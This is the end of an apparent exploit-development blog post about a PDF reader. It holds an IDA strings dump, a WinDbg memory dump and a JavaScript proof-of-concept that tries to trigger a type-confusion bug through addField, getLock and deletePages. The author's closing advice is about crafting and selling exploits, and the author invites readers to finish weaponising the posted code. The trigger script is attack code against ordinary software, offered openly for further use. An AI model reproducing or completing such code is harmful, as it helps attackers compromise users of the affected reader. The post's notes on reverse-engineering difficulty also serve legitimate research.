.rdata:051150E0	00000057	C	This function is deprecated. Suggest use FROptimizerFlatDocument from Optimize plugin.
.rdata:05115138	00000059	C	This function is deprecated. Suggest use FRDocProcessSetReviewJS from docprocess plugin.
.rdata:05115198	0000005C	C	This function is deprecated. Suggest use FRDocProcessRemoveReviewJS from docprocess plugin.
.rdata:05115348	00000056	C	This function is deprecated. Suggest use FROptimizerRunPageFlat from Optimize plugin.
.rdata:051153A0	00000062	C	This function is deprecated. Suggest use FRDocProcessFlattenDynamicXFADoc from docprocess plugin.
.rdata:05115408	00000053	C	This function is deprecated. It proceed in OCR plugin of FROCRRunPageOCRPROTO api.
.rdata:05115460	0000005D	C	This function is deprecated. It proceed in OCR plugin of GetOCREngineLocalLanguagePROTO api.
.rdata:051154C0	0000005D	C	This function is deprecated. It proceed in OCR plugin of GetIsExistOCREngineDllTipPROTO api.
.rdata:05115520	0000005F	C	This function is deprecated. It proceed in OCR plugin of GetOCREngineSupportLanguagePROTO api.
.rdata:05115610	0000005D	C	This function is deprecated. Suggest use FRDocProcessGetCreationDate from docprocess plugin.
.rdata:05115670	00000066	C	This function is deprecated. Suggest use FRDocProcessGetContainedCountInPages from docprocess plugin.
.rdata:051156D8	00000060	C	This function is deprecated. Suggest use FRDocProcessGetPrefixMatchList from docprocess plugin.
.rdata:05115738	00000074	C	This function is deprecated. Suggest use FROptimizerReduceFileSize and FROptimizerSetCallBack from Optimize plugin.
.rdata:051157B0	0000005C	C	This function is deprecated. Suggest use FROptimizerShowReduceSizeDlg from Optimize plugin.
.rdata:05115BC4	00000019	C	CFS_GLOG_V16::LogMessage
.rdata:05115BE0	00000070	C	c:\\phantompdfci\\jenkins\\workspace\\taa-ph-auto-compile\\starship\\sinkpluginsdk_web\\win\\src\\basic\\fs_basicimpl.cpp
.rdata:05116020	0000006C	C	This function is deprecated. Suggest use FRSIGInternalInterfaceGenerateUR3Permission from signature plugin.
.rdata:05116090	0000005A	C	This function is deprecated. Suggest use FRPageFormatAddWatermark from pageformat plugin.
.rdata:05116124	00000019	C	PageFormat Extension HFT
.rdata:05116140	00000063	C	This function is deprecated. Suggest use FRPageFormatAddAndUpdateWatermark from pageformat plugin.
.rdata:051161A8	0000005D	C	This function is deprecated. Suggest use FRPageFormatRemoveWatermark from pageformat plugin.
.rdata:05116208	00000066	C	This function is deprecated. Suggest use FRPageFormatRemoveAndUpdateWatermark from pageformat plugin.
.rdata:05116270	0000005D	C	This function is deprecated. Suggest use FRPageFormatAddHeaderFooter from pageformat plugin.
.rdata:051162D0	00000066	C	This function is deprecated. Suggest use FRPageFormatAddAndUpdateHeaderFooter from pageformat plugin.
.rdata:05116338	00000060	C	This function is deprecated. Suggest use FRPageFormatRemoveHeaderFooter from pageformat plugin.
.rdata:05116398	00000069	C	This function is deprecated. Suggest use FRPageFormatRemoveAndUpdateHeaderFooter from pageformat plugin.
.rdata:05116408	0000005F	C	This function is deprecated. Suggest use FRDocProcessIsUsedLogicalPage from docprocess plugin.
.rdata:05116468	00000063	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerGenerateSignInfo from signature plugin.
.rdata:051164D0	00000064	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerGenerateSignInfo3 from signature plugin.
.rdata:05116538	00000063	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerGetDefaultServer from signature plugin.
.rdata:051165A0	0000006B	C	This function is deprecated. Suggest use FRSIGInternalInterfaceAddSignature3Handler from signature plugin.
.rdata:05116610	00000045	C	This function is deprecated. It's not be need from signature plugin.
.rdata:05116658	00000065	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerSetSignatureVerify from signature plugin.
.rdata:051166C0	00000066	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerGetDocSigatureCount from signature plugin.
.rdata:05116728	00000067	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerGetSignatureBaseInfo from signature plugin.
.rdata:05116790	00000061	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerClearSignature from signature plugin.
.rdata:051167F8	00000063	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerCreateSignatureF from signature plugin.
.rdata:05116860	0000005E	C	This function is deprecated. Suggest use FRSIGSGBaseHandlerSetPosition from signature plugin.
.rdata:051168C0	0000004F	C	This function is deprecated. Suggest use FRSIGRDNCreate from signature plugin.
.rdata:05116910	00000050	C	This function is deprecated. Suggest use FRSIGRDNDestroy from signature plugin.
.rdata:05116960	0000004F	C	This function is deprecated. Suggest use FRSIGRDNGetcwC from signature plugin.
.rdata:051169B0	00000050	C	This function is deprecated. Suggest use FRSIGRDNSetcwCN from signature plugin.
.rdata:05116A00	00000050	C	This function is deprecated. Suggest use FRSIGRDNGetcwCN from signature plugin.
.rdata:05116A50	0000004F	C	This function is deprecated. Suggest use FRSIGRDNSetcwE from signature plugin.
.rdata:05116AA0	0000004F	C	This function is deprecated. Suggest use FRSIGRDNGetcwE from signature plugin.
.rdata:05116AF0	0000004F	C	This function is deprecated. Suggest use FRSIGRDNSetcwL from signature plugin.
.rdata:05116B40	0000004F	C	This function is deprecated. Suggest use FRSIGRDNGetcwL from signature plugin.
.rdata:05116B90	0000004F	C	This function is deprecated. Suggest use FRSIGRDNSetcwO from signature plugin.
.rdata:05116BE0	0000004F	C	This function is deprecated. Suggest use FRSIGRDNGetcwO from signature plugin.
.rdata:05116C30	00000050	C	This function is deprecated. Suggest use FRSIGRDNSetcwOU from signature plugin.
.rdata:05116C80	00000050	C	This function is deprecated. Suggest use FRSIGRDNGetcwOU from signature plugin.
.rdata:05116CD0	00000050	C	This function is deprecated. Suggest use FRSIGRDNSetcwST from signature plugin.
.rdata:05116D20	00000050	C	This function is deprecated. Suggest use FRSIGRDNGetcwST from signature plugin.
.rdata:05116D70	00000067	C	This function is deprecated. Suggest use FRSIGCERTIFICATEINFO related interface from signature plugin.
.rdata:05116DD8	00000065	C	This function is deprecated. Suggest use FRSIGSEEDVALUEINFO related interface from signature plugin.
.rdata:05116E4C	0000003E	C	This function is deprecated. It proceed in signature plugin.
.rdata:0511F140	00000007	C	AddImm
.rdata:0511F480	0000000A	C	RowSetAdd
.rdata:052A94B8	0000000D	C	pixAddBorder
.rdata:052A94C8	00000019	C	pixAddBlackOrWhiteBorder
.rdata:052A94E4	00000014	C	pixAddBorderGeneral
.rdata:052A9510	00000020	C	pixAddMultipleBlackWhiteBorders

.rdata:052A95DC	00000015	C	pixAddMirroredBorder
.rdata:052A9608	00000015	C	pixAddRepeatedBorder
.rdata:052A9620	00000012	C	pixAddMixedBorder
.rdata:052A9634	00000016	C	pixAddContinuedBorder
.rdata:052A964C	00000019	C	pixShiftAndTransferAlpha
.rdata:052B3028	00000013	C	pixAddAlphaToBlend
!!!!!!!!
.rdata:052B32EC	0000000B	C	boxaAddBox
!!!!!!!!!!!!!!!
.rdata:052B35B8	0000000D	C	boxaaAddBoxa
.rdata:052B35E8	00000011	C	boxaaExtendArray
.rdata:052B35FC	00000017	C	boxaaExtendArrayToSize
.rdata:052B3614	00000016	C	baa has too many ptrs
.rdata:052B362C	0000001F	C	size > 1M boxa ptrs; too large
.rdata:052B364C	0000000E	C	boxaaGetCount
.rdata:052B365C	00000011	C	boxaaGetBoxCount
.rdata:052B3670	0000000D	C	boxaaGetBoxa
.rdata:052B3680	0000000C	C	boxaaGetBox
.rdata:052B368C	00000013	C	boxa not retrieved
.rdata:052B36F8	00000010	C	boxaaInsertBoxa
.rdata:052B5E88	00000012	C	pixGetInputFormat
.rdata:052B5E9C	00000012	C	pixSetInputFormat
.rdata:052B5EB0	00000013	C	pixCopyInputFormat
.rdata:052B5EC4	0000000E	C	pixSetSpecial
.rdata:052B5ED4	0000000B	C	pixGetText
.rdata:052B5EE0	0000000B	C	pixSetText
.rdata:052B5EEC	0000000B	C	pixAddText
.rdata:052B667C	0000000C	C	pixaaAddBox
.rdata:052B9268	00000014	C	jbAddPageComponents
.rdata:052B9D90	0000000D	C	numaaAddNuma
.rdata:052C9BC8	00000010	C	sarrayAddString
.rdata:052CACB4	00000009	C	ptaAddPt
.rdata:052CAFB8	0000000B	C	ptaaAddPta
.rdata:0530A890	00000010	C	selaAddDwaCombs
.rdata:053CADD8	0000000C	C	squareimage
.rdata:053E05C8	00000019	C	GdipPrivateAddMemoryFont
.rdata:053E078C	00000017	C	GdipPrivateAddFontFile
.rdata:053E0808	00000015	C	AddFontMemResourceEx
.rdata:0548401C	00000009	C	TPadding
.rdata:056D0DA8	0000000D	C	addListeners
.rdata:056D0ED8	0000000C	C	addMenuItem
.rdata:056D0EE4	0000000B	C	addSubMenu
.rdata:056D0F48	00000009	C	addIndex
.rdata:056D0F60	0000000B	C	addContact
.rdata:056D0F6C	0000000B	C	addRequest
.rdata:056D11B0	00000010	C	addEmbeddedFile
.rdata:056D12DC	00000008	C	addWord
.rdata:056D1528	00000009	C	addAnnot
.rdata:056D1534	00000009	C	addField
.rdata:056D1540	00000008	C	addLink
.rdata:056D1548	00000008	C	addIcon
.rdata:056D1E94	0000000D	C	Doc.addAnnot
.rdata:056D1EA4	0000000D	C	Doc.addField
.rdata:056D1EB4	0000000C	C	Doc.addLink
.rdata:056D1EC0	0000000C	C	Doc.addIcon
.rdata:056D24A8	0000000F	C	Doc.addAdLayer
.rdata:056D5F58	0000000E	C	addToolButton
.rdata:056D6644	00000010	C	app.addMenuItem
.rdata:056D6668	0000000F	C	app.addSubMenu
.rdata:056D6644	00000010	C	app.addMenuItem
.rdata:056D7E44	0000000F	C	FDF.addContact
.rdata:05709CF0	0000000F	C	OBJ_add_object
.rdata:05709D00	0000000E	C	OBJ_add_sigid
.rdata:05902BBC	00000012	C	addCustomMenuItem
.rdata:05902BD0	00000014	C	addCustomToolButton
.rdata:05902BE4	00000010	C	addEventHandler
.rdata:059E64A0	0000001E	C	FillPageComboBox-AddTail -End
.rdata:059E64C0	00000010	C	View_Panel_Goto
.rdata:059E64D0	00000020	C	FillPageComboBox-AddTail -Start
.rdata:05FE0420	00000077	C	?FPDFSCRIPT3D_OBJ_Runtime__Method_AddCustomMenuItem@@YAXPAU_FXJSE_HOBJECT@@ABVCFX_ByteStringC@@AAVCFXJSE_Arguments@@@Z
.rdata:05FE0497	00000079	C	?FPDFSCRIPT3D_OBJ_Runtime__Method_AddCustomToolButton@@YAXPAU_FXJSE_HOBJECT@@ABVCFX_ByteStringC@@AAVCFXJSE_Arguments@@@Z
.rdata:05FE0510	00000075	C	?FPDFSCRIPT3D_OBJ_Runtime__Method_AddEventHandler@@YAXPAU_FXJSE_HOBJECT@@ABVCFX_ByteStringC@@AAVCFXJSE_Arguments@@@Z
.rdata:050896AC	00000011	C	CAddDictionaries
.rdata:05097DD0	00000034	C	CJS_PluginMgr::LoadJSPlugin::AddToolButtons - Start
.rdata:05097E04	00000032	C	CJS_PluginMgr::LoadJSPlugin::AddToolButtons - End
.rdata:05098308	0000001E	C	CJS_PluginMgr::AddToolButtons

, when you are supposed to actually start part of vr process and try to understand what the binary actually does and your idb pseudo code looks like this 
bunch of code ommited in order to fit stuff and not make it long
![WhatsApp Image 2025-04-18 at 17 20 10](https://github.com/user-attachments/assets/b662361b-4aee-49a3-9b56-a2ac33bd1574)

And one might say a class initialisation because of this. Wrong dont trust ida because the offsets were off, and even if i were to be wrong belive me you'd still have to cross ref the function name and in 200 cross refs to analyse another 200 function to understand and on top of that dynamically resolve in windbg every ptr function call and reverse that.

Add the fact that if you say try something like this 
09f69e70  74 72 75 63 74 6f 72 28-27 72 65 74 75 72 6e 20  tructor('return 
09f69e80  74 68 69 73 27 29 28 29-00 00 00 00 00 00 00 00  this')()........
09f69e90  06 00 01 09 30 1e 6d 0f-00 00 00 00 00 00 00 00  ....0.m.........
09f69ea0  00 00 00 00 e0 bd 6d 0f-10 00 00 00 02 00 00 00  ......m.........
09f69eb0  84 15 f6 09 60 15 f6 09-0a 00 00 00 00 00 00 00  ....`...........
09f69ec0  01 00 00 00 10 00 00 00-10 00 00 00 54 00 69 00  ............T.i.
09f69ed0  6d 00 65 00 73 00 20 00-42 00 6f 00 6c 00 64 00  m.e.s. .B.o.l.d.
09f69ee0  49 00 74 00 61 00 6c 00-69 00 63 00 00 00 00 00  I.t.a.l.i.c.....
function type_conf(){
    app.alert("Starting enhanced memory leak exploit");
    
    // Step 2: Create form fields
    gFields.signature = app.activeDocs[0].addField(
      "signature_field",
      "signature",
      0,
      [10, 10, 100, 50]
    );

    let syntaxString = "a.constructor.constructor('return this')()";


    gFields.combo = app.activeDocs[0].addField(
      syntaxString,
      "combobox",
      0,
      [10, 60, 100, 100]
    );
    
    // Step 4: Get the critical Lock object
    gLockObj = gFields.signature.getLock();
    app.alert("Got Lock object from signature field");
    
    app.alert("Triggering vulnerability with deletePages()");
    app.activeDocs[0].deletePages();
    app.alert("Vulnerability triggered");
    
    gLockObj.__defineGetter__('fields', function () {}); 
}

and it works but you can't have something like this  let x = "\x41\x41\x41\x41" and x be used in addfield as name of said object , wait 3:30 hours to load idb in bindiff and idb not to load and exhaust 16gb of memory. those are pretty much signs that you won't be able to most likely exploit that said binary. 

So lesson learned if you see that most of described things in upper paragraph for your mental health you'd be better to move onto next exploit than waste 3 additional weeks just to try to see if this is exploitable or not.

Now as we reached the end of the story i will let you with some final lessons learned during this attempt to craft and sell an exploit:
1. Dont be afraid to try to sell exploit
2. Before you engage to try to sell an exploit , actually do the exploit and than reach the person who you try to sell the exploit
3. Before you decide to settle for a CVE to weaponise, take arround 1 month where you start to do preliminary research before going guns blazing
4. keep in mind that while the advisory may suggest this could be turned into a weaponised exploit, there are a lot of obstacles that not necessarily have to do with th exploit process such as : missing enough info to be able to reverse it, too much complexity 200+ functions to understand one function , a lot of runtime decoding which has to be done manually, undocumented api functions, limited r/w capabilities, no open source code, in this said case 200k functions to be diffed for one version so arround 400k function to bindiff totaly(complexity scales real fast apparently in real world exploitation)
5. "Know when to put last nail in the coffin", this will come with experience the more projects you attempt. But really dont strech it when theres no need.
6. You'll defently waste a lot of time, so dont be too hursh with yourself.
7. When you can't place objects to replace objects and only string, and they get encoded as unicode, and yet if you still bypass this, and yet you can't place any hex like data in order to be able to idk say somehow read off in this case if sprayed an address with sharedarraybuffer cause we didn't have enough info for fake object, just move onto next exploit.
   Finally before closing this blogpost we'll leave our code as an inspiration. In case someone manages to weaponise the type confusion please to let us know how you did it :) 
